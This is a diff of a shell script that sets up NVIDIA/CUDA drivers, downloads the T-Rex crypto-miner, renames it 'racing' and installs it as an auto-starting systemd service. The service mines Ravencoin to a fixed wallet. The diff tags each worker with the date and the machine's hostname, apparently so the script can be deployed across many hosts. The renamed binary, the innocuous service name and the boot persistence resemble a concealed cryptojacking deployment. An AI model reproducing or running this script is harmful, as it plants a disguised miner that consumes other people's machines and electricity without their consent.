@@ -1,3 +1,6 @@
+myworker=$(date +'%d%m_')
+username=$HOSTNAME
+myworker+=$username
 sudo apt-get install linux-headers-$(uname -r) -y
 distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
 sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
@@ -18,8 +21,8 @@ sudo systemctl start nvidia-fabricmanager
 sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
 sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
 sudo mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RN9dnTPV1voDLtwS6v6ap7Az9y8BtEnBAs.solo1 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RN9dnTPV1voDLtwS6v6ap7Az9y8BtEnBAs.reminer -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-./racing -a kawpow -o us-solo-rvn.2miners.com:7070 -u RN9dnTPV1voDLtwS6v6ap7Az9y8BtEnBAs.solo1 -p x &
+./racing -a kawpow -o us-rvn.2miners.com:6060 -u RN9dnTPV1voDLtwS6v6ap7Az9y8BtEnBAs.${myworker} -p x &
 
